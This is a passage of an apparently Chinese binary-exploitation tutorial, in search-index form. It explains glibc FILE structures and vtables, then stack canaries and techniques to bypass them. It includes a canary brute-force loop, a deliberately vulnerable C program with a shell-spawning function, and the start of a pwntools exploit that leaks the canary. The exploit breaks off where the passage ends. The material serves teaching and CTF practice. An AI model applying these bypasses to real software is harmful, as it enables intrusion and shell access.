\u5728\u6807\u51c6I/O\u5e93\u4e2d\uff0c\u6bcf\u4e2a\u7a0b\u5e8f\u542f\u52a8\u65f6\u6709\u4e09\u4e2a\u6587\u4ef6\u6d41\u662f\u81ea\u52a8\u6253\u5f00\u7684\uff1astdin\u3001stdout\u3001stderr\u3002\u56e0\u6b64\u5728\u521d\u59cb\u72b6\u6001\u4e0b\uff0c_IO_list_all\u6307\u5411\u4e86\u4e00\u4e2a\u6709\u8fd9\u4e9b\u6587\u4ef6\u6d41\u6784\u6210\u7684\u94fe\u8868\uff0c\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e09\u4e2a\u6587\u4ef6\u6d41\u4f4d\u4e8elibc.so\u7684\u6570\u636e\u6bb5\u3002\u800c\u6211\u4eec\u4f7f\u7528fopen\u521b\u5efa\u7684\u6587\u4ef6\u6d41\u662f\u5206\u914d\u5728\u5806\u5185\u5b58\u4e0a\u7684\u3002 \u6211\u4eec\u53ef\u4ee5\u5728libc.so\u4e2d\u627e\u5230stdin\\stdout\\stderr\u7b49\u7b26\u53f7\uff0c\u8fd9\u4e9b\u7b26\u53f7\u662f\u6307\u5411FILE\u7ed3\u6784\u7684\u6307\u9488\uff0c\u771f\u6b63\u7ed3\u6784\u7684\u7b26\u53f7\u662f _IO_2_1_stderr_ _IO_2_1_stdout_ _IO_2_1_stdin_ \u4f46\u662f\u4e8b\u5b9e\u4e0a_IO_FILE\u7ed3\u6784\u5916\u5305\u88f9\u7740\u53e6\u4e00\u79cd\u7ed3\u6784_IO_FILE_plus\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u4e00\u4e2a\u91cd\u8981\u7684\u6307\u9488vtable\u6307\u5411\u4e86\u4e00\u7cfb\u5217\u51fd\u6570\u6307\u9488\u3002 \u5728libc2.23\u7248\u672c\u4e0b\uff0c32\u4f4d\u7684vtable\u504f\u79fb\u4e3a0x94\uff0c64\u4f4d\u504f\u79fb\u4e3a0x228 struct _IO_FILE_plus { _IO_FILE file; IO_jump_t *vtable; } vtable\u662fIO_jump_t\u7c7b\u578b\u7684\u6307\u9488\uff0cIO_jump_t\u4e2d\u4fdd\u5b58\u4e86\u4e00\u4e9b\u51fd\u6570\u6307\u9488\uff0c\u5728\u540e\u9762\u6211\u4eec\u4f1a\u770b\u5230\u5728\u4e00\u7cfb\u5217\u6807\u51c6IO\u51fd\u6570\u4e2d\u4f1a\u8c03\u7528\u8fd9\u4e9b\u51fd\u6570\u6307\u9488 void * funcs[] = { 1 NULL, // \"extra word\" 2 NULL, // DUMMY 3 exit, // finish 4 NULL, // overflow 5 NULL, // underflow 6 NULL, // uflow 7 NULL, // pbackfail 8 NULL, // xsputn #printf 9 NULL, // xsgetn 10 NULL, // seekoff 11 NULL, // seekpos 12 NULL, // setbuf 13 NULL, // sync 14 NULL, // doallocate 15 NULL, // read 16 NULL, // write 17 NULL, // seek 18 pwn, // close 19 NULL, // stat 20 NULL, // showmanyc 21 NULL, // imbue };","title":"FILE\u4ecb\u7ecd"},{"location":"pwn/io_file/introduction/#fread","text":"fread\u662f\u6807\u51c6IO\u5e93\u51fd\u6570\uff0c\u4f5c\u7528\u662f\u4ece\u6587\u4ef6\u6d41\u4e2d\u8bfb\u6570\u636e\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ; buffer \u5b58\u653e\u8bfb\u53d6\u6570\u636e\u7684\u7f13\u51b2\u533a\u3002 size\uff1a\u6307\u5b9a\u6bcf\u4e2a\u8bb0\u5f55\u7684\u957f\u5ea6\u3002 count\uff1a \u6307\u5b9a\u8bb0\u5f55\u7684\u4e2a\u6570\u3002 stream\uff1a\u76ee\u6807\u6587\u4ef6\u6d41\u3002 \u8fd4\u56de\u503c\uff1a\u8fd4\u56de\u8bfb\u53d6\u5230\u6570\u636e\u7f13\u51b2\u533a\u4e2d\u7684\u8bb0\u5f55\u4e2a\u6570 fread\u7684\u4ee3\u7801\u4f4d\u4e8e/libio/iofread.c\u4e2d\uff0c\u51fd\u6570\u540d\u4e3a_IO_fread\uff0c\u4f46\u771f\u6b63\u7684\u529f\u80fd\u5b9e\u73b0\u5728\u5b50\u51fd\u6570_IO_sgetn\u4e2d\u3002 _IO_size_t _IO_fread (buf, size, count, fp) void *buf; _IO_size_t size; _IO_size_t count; _IO_FILE *fp; { ... bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested); ... } \u5728_IO_sgetn\u51fd\u6570\u4e2d\u4f1a\u8c03\u7528_IO_XSGETN\uff0c\u800c_IO_XSGETN\u662f_IO_FILE_plus.vtable\u4e2d\u7684\u51fd\u6570\u6307\u9488\uff0c\u5728\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u65f6\u4f1a\u9996\u5148\u53d6\u51favtable\u4e2d\u7684\u6307\u9488\u7136\u540e\u518d\u8fdb\u884c\u8c03\u7528\u3002 _IO_size_t _IO_sgetn (fp, data, n) _IO_FILE *fp; void *data; _IO_size_t n; { return _IO_XSGETN (fp, data, n); } \u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u51fd\u6570\u6307\u9488\u662f\u6307\u5411_IO_file_xsgetn\u51fd\u6570\u7684\uff0c if (fp->_IO_buf_base && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base)) { if (__underflow (fp) == EOF) break; continue; }","title":"fread"},{"location":"pwn/io_file/introduction/#fwrite","text":"fwrite\u540c\u6837\u662f\u6807\u51c6IO\u5e93\u51fd\u6570\uff0c\u4f5c\u7528\u662f\u5411\u6587\u4ef6\u6d41\u5199\u5165\u6570\u636e\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream); buffer:\u662f\u4e00\u4e2a\u6307\u9488\uff0c\u5bf9fwrite\u6765\u8bf4\uff0c\u662f\u8981\u5199\u5165\u6570\u636e\u7684\u5730\u5740; size:\u8981\u5199\u5165\u5185\u5bb9\u7684\u5355\u5b57\u8282\u6570; count:\u8981\u8fdb\u884c\u5199\u5165size\u5b57\u8282\u7684\u6570\u636e\u9879\u7684\u4e2a\u6570; stream:\u76ee\u6807\u6587\u4ef6\u6307\u9488; \u8fd4\u56de\u503c\uff1a\u5b9e\u9645\u5199\u5165\u7684\u6570\u636e\u9879\u4e2a\u6570count\u3002 fwrite\u7684\u4ee3\u7801\u4f4d\u4e8e/libio/iofwrite.c\u4e2d\uff0c\u51fd\u6570\u540d\u4e3a_IO_fwrite\u3002 \u5728_IO_fwrite\u4e2d\u4e3b\u8981\u662f\u8c03\u7528_IO_XSPUTN\u6765\u5b9e\u73b0\u5199\u5165\u7684\u529f\u80fd\u3002 \u6839\u636e\u524d\u9762\u5bf9_IO_FILE_plus\u7684\u4ecb\u7ecd\uff0c\u53ef\u77e5_IO_XSPUTN\u4f4d\u4e8e_IO_FILE_plus\u7684vtable\u4e2d\uff0c\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u9700\u8981\u9996\u5148\u53d6\u51favtable\u4e2d\u7684\u6307\u9488\uff0c\u518d\u8df3\u8fc7\u53bb\u8fdb\u884c\u8c03\u7528\u3002 written = _IO_sputn (fp, (const char *) buf, request); \u5728_IO_XSPUTN\u5bf9\u5e94\u7684\u9ed8\u8ba4\u51fd\u6570_IO_new_file_xsputn\u4e2d\u4f1a\u8c03\u7528\u540c\u6837\u4f4d\u4e8evtable\u4e2d\u7684_IO_OVERFLOW /* Next flush the (full) buffer. */ if (_IO_OVERFLOW (f, EOF) == EOF) _IO_OVERFLOW\u9ed8\u8ba4\u5bf9\u5e94\u7684\u51fd\u6570\u662f_IO_new_file_overflow if (ch == EOF) return _IO_do_write (f, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base); if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */ if (_IO_do_flush (f) == EOF) return EOF; \u5728_IO_new_file_overflow\u5185\u90e8\u6700\u7ec8\u4f1a\u8c03\u7528\u7cfb\u7edf\u63a5\u53e3write\u51fd\u6570","title":"fwrite"},{"location":"pwn/io_file/introduction/#fopen","text":"fopen\u5728\u6807\u51c6IO\u5e93\u4e2d\u7528\u4e8e\u6253\u5f00\u6587\u4ef6\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b FILE *fopen(char *filename, *type); filename:\u76ee\u6807\u6587\u4ef6\u7684\u8def\u5f84 type:\u6253\u5f00\u65b9\u5f0f\u7684\u7c7b\u578b \u8fd4\u56de\u503c:\u8fd4\u56de\u4e00\u4e2a\u6587\u4ef6\u6307\u9488 \u5728fopen\u5185\u90e8\u4f1a\u521b\u5efaFILE\u7ed3\u6784\u5e76\u8fdb\u884c\u4e00\u4e9b\u521d\u59cb\u5316\u64cd\u4f5c\uff0c\u4e0b\u9762\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u8fc7\u7a0b \u9996\u5148\u5728fopen\u5bf9\u5e94\u7684\u51fd\u6570__fopen_internal\u5185\u90e8\u4f1a\u8c03\u7528malloc\u51fd\u6570\uff0c\u5206\u914dFILE\u7ed3\u6784\u7684\u7a7a\u95f4\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u83b7\u77e5FILE\u7ed3\u6784\u662f\u5b58\u50a8\u5728\u5806\u4e0a\u7684 *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE)); \u4e4b\u540e\u4f1a\u4e3a\u521b\u5efa\u7684FILE\u521d\u59cb\u5316vtable\uff0c\u5e76\u8c03\u7528_IO_file_init\u8fdb\u4e00\u6b65\u521d\u59cb\u5316\u64cd\u4f5c _IO_JUMPS (&new_f->fp) = &_IO_file_jumps; _IO_file_init (&new_f->fp); \u5728_IO_file_init\u51fd\u6570\u7684\u521d\u59cb\u5316\u64cd\u4f5c\u4e2d\uff0c\u4f1a\u8c03\u7528_IO_link_in\u628a\u65b0\u5206\u914d\u7684FILE\u94fe\u5165_IO_list_all\u4e3a\u8d77\u59cb\u7684FILE\u94fe\u8868\u4e2d void _IO_link_in (fp) struct _IO_FILE_plus *fp; { if ((fp->file._flags & _IO_LINKED) == 0) { fp->file._flags |= _IO_LINKED; fp->file._chain = (_IO_FILE *) _IO_list_all; _IO_list_all = fp; ++_IO_list_all_stamp; } } \u4e4b\u540e__fopen_internal\u51fd\u6570\u4f1a\u8c03\u7528_IO_file_fopen\u51fd\u6570\u6253\u5f00\u76ee\u6807\u6587\u4ef6\uff0c_IO_file_fopen\u4f1a\u6839\u636e\u7528\u6237\u4f20\u5165\u7684\u6253\u5f00\u6a21\u5f0f\u8fdb\u884c\u6253\u5f00\u64cd\u4f5c\uff0c\u603b\u4e4b\u6700\u540e\u4f1a\u8c03\u7528\u5230\u7cfb\u7edf\u63a5\u53e3open\u51fd\u6570\uff0c\u8fd9\u91cc\u4e0d\u518d\u6df1\u5165\u3002 if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL) return __fopen_maybe_mmap (&new_f->fp.file); \u603b\u7ed3\u4e00\u4e0bfopen\u7684\u64cd\u4f5c\u662f \u4f7f\u7528malloc\u5206\u914dFILE\u7ed3\u6784 \u8bbe\u7f6eFILE\u7ed3\u6784\u7684vtable \u521d\u59cb\u5316\u5206\u914d\u7684FILE\u7ed3\u6784 \u5c06\u521d\u59cb\u5316\u7684FILE\u7ed3\u6784\u94fe\u5165FILE\u7ed3\u6784\u94fe\u8868\u4e2d \u8c03\u7528\u7cfb\u7edf\u8c03\u7528\u6253\u5f00\u6587\u4ef6","title":"fopen"},{"location":"pwn/io_file/introduction/#fclose","text":"fclose\u662f\u6807\u51c6IO\u5e93\u4e2d\u7528\u4e8e\u5173\u95ed\u5df2\u6253\u5f00\u6587\u4ef6\u7684\u51fd\u6570\uff0c\u5176\u4f5c\u7528\u4e0efopen\u76f8\u53cd\u3002 int fclose(FILE *stream) \u529f\u80fd\uff1a\u5173\u95ed\u4e00\u4e2a\u6587\u4ef6\u6d41\uff0c\u4f7f\u7528fclose\u5c31\u53ef\u4ee5\u628a\u7f13\u51b2\u533a\u5185\u6700\u540e\u5269\u4f59\u7684\u6570\u636e\u8f93\u51fa\u5230\u78c1\u76d8\u6587\u4ef6\u4e2d\uff0c\u5e76\u91ca\u653e\u6587\u4ef6\u6307\u9488\u548c\u6709\u5173\u7684\u7f13\u51b2\u533a fclose\u9996\u5148\u4f1a\u8c03\u7528_IO_unlink_it\u5c06\u6307\u5b9a\u7684FILE\u4ece_chain\u94fe\u8868\u4e2d\u8131\u94fe if (fp->_IO_file_flags & _IO_IS_FILEBUF) _IO_un_link ((struct _IO_FILE_plus *) fp); \u4e4b\u540e\u4f1a\u8c03\u7528_IO_file_close_it\u51fd\u6570\uff0c_IO_file_close_it\u4f1a\u8c03\u7528\u7cfb\u7edf\u63a5\u53e3close\u5173\u95ed\u6587\u4ef6 if (fp->_IO_file_flags & _IO_IS_FILEBUF) status = _IO_file_close_it (fp); \u6700\u540e\u8c03\u7528vtable\u4e2d\u7684_IO_FINISH\uff0c\u5176\u5bf9\u5e94\u7684\u662f_IO_file_finish\u51fd\u6570\uff0c\u5176\u4e2d\u4f1a\u8c03\u7528free\u51fd\u6570\u91ca\u653e\u4e4b\u524d\u5206\u914d\u7684FILE\u7ed3\u6784 _IO_FINISH (fp);","title":"fclose"},{"location":"pwn/io_file/introduction/#printfputs","text":"printf\u548cputs\u662f\u5e38\u7528\u7684\u8f93\u51fa\u51fd\u6570\uff0c\u5728printf\u7684\u53c2\u6570\u662f\u4ee5'\\n'\u7ed3\u675f\u7684\u7eaf\u5b57\u7b26\u4e32\u65f6\uff0cprintf\u4f1a\u88ab\u4f18\u5316\u4e3aputs\u51fd\u6570\u5e76\u53bb\u9664\u6362\u884c\u7b26\u3002 puts\u5728\u6e90\u7801\u4e2d\u5b9e\u73b0\u7684\u51fd\u6570\u662f_IO_puts\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u64cd\u4f5c\u4e0efwrite\u7684\u6d41\u7a0b\u5927\u81f4\u76f8\u540c\uff0c\u51fd\u6570\u5185\u90e8\u540c\u6837\u4f1a\u8c03\u7528vtable\u4e2d\u7684_IO_sputn\uff0c\u7ed3\u679c\u4f1a\u6267\u884c_IO_new_file_xsputn\uff0c\u6700\u540e\u4f1a\u8c03\u7528\u5230\u7cfb\u7edf\u63a5\u53e3write\u51fd\u6570\u3002 printf\u7684\u8c03\u7528\u6808\u56de\u6eaf\u5982\u4e0b\uff0c\u540c\u6837\u662f\u901a\u8fc7_IO_file_xsputn\u5b9e\u73b0 vfprintf+11 _IO_file_xsputn _IO_file_overflow funlockfile _IO_file_write write","title":"printf/puts"},{"location":"pwn/mitigation/Canary/","text":"Canary \u00b6 0.Introduction \u00b6 \u7531\u4e8estack overflow\u800c\u5f15\u53d1\u7684\u653b\u51fb\u975e\u5e38\u666e\u904d\u4e5f\u975e\u5e38\u53e4\u8001, \u76f8\u5e94\u5730\u4e00\u79cd\u53eb\u505acanary\u7684 mitigation\u6280\u672f\u5f88\u65e9\u5c31\u51fa\u73b0\u5728gcc/glibc\u91cc, \u76f4\u5230\u73b0\u5728\u4e5f\u4f5c\u4e3a\u7cfb\u7edf\u5b89\u5168\u7684\u7b2c\u4e00\u9053\u9632\u7ebf\u5b58\u5728\u3002 canary\u4e0d\u7ba1\u662f\u5b9e\u73b0\u8fd8\u662f\u8bbe\u8ba1\u601d\u60f3\u90fd\u6bd4\u8f83\u7b80\u5355\u9ad8\u6548, \u5c31\u662f\u63d2\u5165\u4e00\u4e2a\u503c, \u5728stack overflow\u53d1\u751f\u7684 \u9ad8\u5371\u533a\u57df\u7684\u5c3e\u90e8, \u5f53\u51fd\u6570\u8fd4\u56de\u4e4b\u65f6\u68c0\u6d4bcanary\u7684\u503c\u662f\u5426\u7ecf\u8fc7\u4e86\u6539\u53d8, \u4ee5\u6b64\u6765\u5224\u65adstack/buffer overflow\u662f\u5426\u53d1\u751f. Canary\u4e0ewindows\u4e0b\u7684GS\u4fdd\u62a4\u90fd\u662f\u9632\u6b62\u6808\u6ea2\u51fa\u7684\u6709\u6548\u624b\u6bb5\uff0c\u5b83\u7684\u51fa\u73b0\u5f88\u5927\u7a0b\u5ea6\u4e0a\u9632\u6b62\u4e86\u6808\u6ea2\u51fa\u7684\u51fa\u73b0\uff0c\u5e76\u4e14\u7531\u4e8e\u5b83\u51e0\u4e4e\u5e76\u4e0d\u6d88\u8017\u7cfb\u7edf\u8d44\u6e90\uff0c\u6240\u4ee5\u73b0\u5728\u6210\u4e86linux\u4e0b\u4fdd\u62a4\u673a\u5236\u7684\u6807\u914d 1.Canary \u539f\u7406 \u00b6 1.1\u5728GCC\u4e2d\u4f7f\u7528Canary \u00b6 \u53ef\u4ee5\u5728GCC\u4e2d\u4f7f\u7528\u4ee5\u4e0b\u53c2\u6570\u8bbe\u7f6eCanary: - fstack - protector \u542f\u7528\u4fdd\u62a4\uff0c\u4e0d\u8fc7\u53ea\u4e3a\u5c40\u90e8\u53d8\u91cf\u4e2d\u542b\u6709\u6570\u7ec4\u7684\u51fd\u6570\u63d2\u5165\u4fdd\u62a4 - fstack - protector - all \u542f\u7528\u4fdd\u62a4\uff0c\u4e3a\u6240\u6709\u51fd\u6570\u63d2\u5165\u4fdd\u62a4 - fstack - protector - strong - fstack - protector - explicit \u53ea\u5bf9\u6709\u660e\u786e stack_protect attribute\u7684\u51fd\u6570\u5f00\u542f\u4fdd\u62a4 - fno - stack - protector \u7981\u7528\u4fdd\u62a4 . 1.2Canary\u5b9e\u73b0\u539f\u7406 \u00b6 \u5f00\u542fCanary\u4fdd\u62a4\u7684stack\u7ed3\u6784\u5927\u6982\u5982\u4e0b High Address | | +-----------------+ | args | +-----------------+ | return address | +-----------------+ rbp => | old ebp | +-----------------+ rbp-8 => | canary value | +-----------------+ | \u5c40\u90e8\u53d8\u91cf | Low | | Address \u5f53\u7a0b\u5e8f\u542f\u7528Canary\u7f16\u8bd1\u540e\uff0c\u5728\u51fd\u6570\u5e8f\u8a00\u90e8\u5206\u4f1a\u53d6fs\u5bc4\u5b58\u56680x28\u5904\u7684\u503c\uff0c\u5b58\u653e\u5728\u6808\u4e2d%ebp-0x8\u7684\u4f4d\u7f6e\u3002 \u8fd9\u4e2a\u64cd\u4f5c\u5373\u4e3a\u5411\u6808\u4e2d\u63d2\u5165Canary\u503c\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a mov rax, qword ptr fs:[0x28] mov qword ptr [rbp - 8], rax \u5728\u51fd\u6570\u8fd4\u56de\u4e4b\u524d\uff0c\u4f1a\u5c06\u8be5\u503c\u53d6\u51fa\uff0c\u5e76\u4e0efs:0x28\u7684\u503c\u8fdb\u884c\u5f02\u6216\u3002\u5982\u679c\u6291\u6216\u7684\u7ed3\u679c\u4e3a0\uff0c\u8bf4\u660ecanary\u672a\u88ab\u4fee\u6539\uff0c\u51fd\u6570\u4f1a\u6b63\u5e38\u8fd4\u56de\uff0c\u8fd9\u4e2a\u64cd\u4f5c\u5373\u4e3a\u68c0\u6d4b\u662f\u5426\u53d1\u751f\u6808\u6ea2\u51fa\u3002 mov rdx,QWORD PTR [rbp-0x8] xor rdx,QWORD PTR fs:0x28 je 0x4005d7 <main+65> call 0x400460 <__stack_chk_fail@plt> \u5982\u679ccanary\u5df2\u7ecf\u88ab\u975e\u6cd5\u4fee\u6539\uff0c\u6b64\u65f6\u7a0b\u5e8f\u6d41\u7a0b\u4f1a\u8d70\u5230 stack_chk_fail\u3002 stack_chk_fail\u4e5f\u662f\u4f4d\u4e8eglibc\u4e2d\u7684\u51fd\u6570\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u7ecf\u8fc7ELF\u7684\u5ef6\u8fdf\u7ed1\u5b9a\uff0c\u5b9a\u4e49\u5982\u4e0b\u3002 eglibc-2.19/debug/stack_chk_fail.c void __attribute__ ((noreturn)) __stack_chk_fail (void) { __fortify_fail (\"stack smashing detected\"); } void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg) { /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"<unknown>\"); } \u8fd9\u610f\u5473\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301 stack_chk_fail\u7684got\u503c\u52ab\u6301\u6d41\u7a0b\u6216\u8005\u5229\u7528 stack_chk_fail\u6cc4\u6f0f\u5185\u5bb9(\u53c2\u89c1stack smash)\u3002 \u8fdb\u4e00\u6b65\uff0c\u5bf9\u4e8eLinux\u6765\u8bf4\uff0cfs\u5bc4\u5b58\u5668\u5b9e\u9645\u6307\u5411\u7684\u662f\u5f53\u524d\u6808\u7684TLS\u7ed3\u6784\uff0cfs:0x28\u6307\u5411\u7684\u6b63\u662fstack_guard\u3002 typedef struct { void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; uintptr_t sysinfo; uintptr_t stack_guard; ... } tcbhead_t; \u5982\u679c\u5b58\u5728\u6ea2\u51fa\u53ef\u4ee5\u8986\u76d6\u4f4d\u4e8eTLS\u4e2d\u4fdd\u5b58\u7684Canary\u503c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7ed5\u8fc7\u4fdd\u62a4\u673a\u5236\u3002 \u4e8b\u5b9e\u4e0a\uff0cTLS\u4e2d\u7684\u503c\u7531\u51fd\u6570security_init\u8fdb\u884c\u521d\u59cb\u5316\u3002 static void security_init (void) { // _dl_random\u7684\u503c\u5728\u8fdb\u5165\u8fd9\u4e2a\u51fd\u6570\u7684\u65f6\u5019\u5c31\u5df2\u7ecf\u7531kernel\u5199\u5165. // glibc\u76f4\u63a5\u4f7f\u7528\u4e86_dl_random\u7684\u503c\u5e76\u6ca1\u6709\u7ed9\u8d4b\u503c // \u5982\u679c\u4e0d\u91c7\u7528\u8fd9\u79cd\u6a21\u5f0f, glibc\u4e5f\u53ef\u4ee5\u81ea\u5df1\u4ea7\u751f\u968f\u673a\u6570 //\u5c06_dl_random\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u8bbe\u7f6e\u4e3a0x0 uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random); // \u8bbe\u7f6eCanary\u7684\u503c\u5230TLS\u4e2d THREAD_SET_STACK_GUARD (stack_chk_guard); _dl_random = NULL; } //THREAD_SET_STACK_GUARD\u5b8f\u7528\u4e8e\u8bbe\u7f6eTLS #define THREAD_SET_STACK_GUARD(value) \\ THREAD_SETMEM (THREAD_SELF, header.stack_guard, value) 2.Canary\u7ed5\u8fc7\u6280\u672f \u00b6 2.1 \u5e8f\u8a00 \u00b6 Canary\u662f\u4e00\u79cd\u5341\u5206\u6709\u6548\u7684\u89e3\u51b3\u6808\u6ea2\u51fa\u95ee\u9898\u7684\u6f0f\u6d1e\u7f13\u89e3\u63aa\u65bd\u3002\u4f46\u662f\u5e76\u4e0d\u610f\u5473\u7740Canary\u5c31\u80fd\u591f\u963b\u6b62\u6240\u6709\u7684\u6808\u6ea2\u51fa\u5229\u7528\uff0c\u5728\u8fd9\u91cc\u7ed9\u51fa\u4e86\u5e38\u89c1\u7684\u5b58\u5728Canary\u7684\u6808\u6ea2\u51fa\u5229\u7528\u601d\u8def\uff0c\u8bf7\u6ce8\u610f\u6bcf\u79cd\u65b9\u6cd5\u90fd\u6709\u7279\u5b9a\u7684\u73af\u5883\u8981\u6c42\u3002 2.2 \u6cc4\u9732\u6808\u4e2d\u7684Canary \u00b6 Canary\u8bbe\u8ba1\u4e3a\u4ee5\u5b57\u8282\"\\x00\"\u7ed3\u5c3e\uff0c\u672c\u610f\u662f\u4e3a\u4e86\u4fdd\u8bc1Canary\u53ef\u4ee5\u622a\u65ad\u5b57\u7b26\u4e32\u3002 \u6cc4\u9732\u6808\u4e2d\u7684Canary\u7684\u601d\u8def\u662f\u8986\u76d6Canary\u7684\u4f4e\u5b57\u8282\uff0c\u6765\u6253\u5370\u51fa\u5269\u4f59\u7684Canary\u90e8\u5206\u3002 \u8fd9\u79cd\u5229\u7528\u65b9\u5f0f\u9700\u8981\u5b58\u5728\u5408\u9002\u7684\u8f93\u51fa\u51fd\u6570\uff0c\u5e76\u4e14\u53ef\u80fd\u9700\u8981\u7b2c\u4e00\u6ea2\u51fa\u6cc4\u9732Canary\uff0c\u4e4b\u540e\u518d\u6b21\u6ea2\u51fa\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u3002 2.3 one-by-one\u7206\u7834Canary \u00b6 \u5bf9\u4e8eCanary\uff0c\u4e0d\u4ec5\u6bcf\u6b21\u8fdb\u7a0b\u91cd\u542f\u540e\u7684Canary\u4e0d\u540c(\u76f8\u6bd4GS\uff0cGS\u91cd\u542f\u540e\u662f\u76f8\u540c\u7684)\uff0c\u800c\u4e14\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u7684\u6bcf\u4e2a\u7ebf\u7a0b\u7684Canary\u4e5f\u4e0d\u540c\u3002 \u4f46\u662f\u5b58\u5728\u4e00\u7c7b\u901a\u8fc7fork\u51fd\u6570\u5f00\u542f\u5b50\u8fdb\u7a0b\u4ea4\u4e92\u7684\u9898\u76ee\uff0c\u56e0\u4e3afork\u51fd\u6570\u4f1a\u76f4\u63a5\u62f7\u8d1d\u7236\u8fdb\u7a0b\u7684\u5185\u5b58\uff0c\u56e0\u6b64\u6bcf\u6b21\u521b\u5efa\u7684\u5b50\u8fdb\u7a0b\u7684Canary\u662f\u76f8\u540c\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u6837\u7684\u7279\u70b9\uff0c\u5f7b\u5e95\u9010\u4e2a\u5b57\u8282\u5c06Canary\u7206\u7834\u51fa\u6765\u3002 \u5728\u8457\u540d\u7684offset2libc\u7ed5\u8fc7linux64bit\u7684\u6240\u6709\u4fdd\u62a4\u7684\u6587\u7ae0\u4e2d\uff0c\u4f5c\u8005\u5c31\u662f\u5229\u7528\u8fd9\u6837\u7684\u65b9\u5f0f\u7206\u7834\u5f97\u5230\u7684Canary: \u8fd9\u662f\u7206\u7834\u7684Python\u4ee3\u7801: print \"[+] Brute forcing stack canary \" start = len ( p ) stop = len ( p ) + 8 while len ( p ) < stop : for i in xrange ( 0 , 256 ): res = send2server ( p + chr ( i )) if res != \"\" : p = p + chr ( i ) #print \"\\t[+] Byte found 0x%02x\" % i break if i == 255 : print \"[-] Exploit failed\" sys . exit ( - 1 ) canary = p [ stop : start - 1 : - 1 ] . encode ( \"hex\" ) print \" [+] SSP value is 0x %s \" % canary 2.4\u52ab\u6301__stack_chk_fail\u51fd\u6570 \u00b6 \u5df2\u77e5Canary\u5931\u8d25\u7684\u5904\u7406\u903b\u8f91\u4f1a\u8fdb\u5165\u5230stack_chk_failed\u51fd\u6570\uff0cstack_chk_failed\u51fd\u6570\u662f\u4e00\u4e2a\u666e\u901a\u7684\u5ef6\u8fdf\u7ed1\u5b9a\u51fd\u6570\uff0c\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539GOT\u8868\u52ab\u6301\u8fd9\u4e2a\u51fd\u6570\u3002 \u53c2\u89c1ZCTF2017 Login\uff0c\u5229\u7528\u65b9\u5f0f\u662f\u901a\u8fc7fsb\u6f0f\u6d1e\u7be1\u6539__stack_chk_fail\u7684GOT\u8868\uff0c\u518d\u8fdb\u884cROP\u5229\u7528 2.5\u8986\u76d6TLS\u4e2d\u50a8\u5b58\u7684Canary\u503c \u00b6 \u5df2\u77e5Canary\u50a8\u5b58\u5728TLS\u4e2d\uff0c\u5728\u51fd\u6570\u8fd4\u56de\u524d\u4f1a\u4f7f\u7528\u8fd9\u4e2a\u503c\u8fdb\u884c\u5bf9\u6bd4\u3002\u5f53\u6ea2\u51fa\u5c3a\u5bf8\u8f83\u5927\u65f6\uff0c\u53ef\u4ee5\u540c\u65f6\u8986\u76d6\u6808\u4e0a\u50a8\u5b58\u7684Canary\u548cTLS\u50a8\u5b58\u7684Canary\u5b9e\u73b0\u7ed5\u8fc7\u3002 3.\u5229\u7528\u793a\u4f8b \u00b6 \u5b58\u5728\u6f0f\u6d1e\u7684\u793a\u4f8b\u6e90\u4ee3\u7801\u5982\u4e0b: // ex1.c #include <stdio.h> #include <unistd.h> #include <string.h> void getshell ( void ) { system ( \"/bin/sh\" ); } void init () { setbuf ( stdin , NULL ); setbuf ( stdout , NULL ); setbuf ( stderr , NULL ); } int main ( void ) { int i ; init (); char buf [ 100 ]; for ( i = 0 ; i < 2 ; i ++ ){ scanf ( \"%s\" , & buf ); printf ( buf ); } return 0 ; } \u7f16\u8bd1\u4e3a32bit\u7a0b\u5e8f\uff0c\u5f00\u542fNX\uff0cASLR\uff0cCanary\u4fdd\u62a4 3.1\u6cc4\u9732Canary\u793a\u4f8b \u00b6 \u9996\u5148\u901a\u8fc7\u8986\u76d6Canary\u6700\u540e\u4e00\u4e2a\"\\x00\"\u5b57\u8282\u6765\u6253\u5370\u51fa4\u4f4d\u7684Canary \u4e4b\u540e\uff0c\u8ba1\u7b97\u597d\u504f\u79fb\uff0c\u5c06Canary\u586b\u5165\u5230\u76f8\u5e94\u7684\u6ea2\u51fa\u4f4d\u7f6e\uff0c\u5b9e\u73b0Ret\u5230getshell\u51fd\u6570\u4e2d #!/usr/bin/env python from pwn import * context . binary = ' ex2 ' #context.log_level = 'debug' io = process ( ' . / ex2 ' ) get_shell = 0x804859d io . recvuntil ( \"Hello Hacker! \\n \" ) # leak Canary payload = \"A\" * 100 io . sendline ( payload ) io . recvuntil ( \"A\" * 100 ) Canary = u32 ( io . recv ( 4 )) - 0xa log . info ( \"Canary:\" + hex ( Canary )) 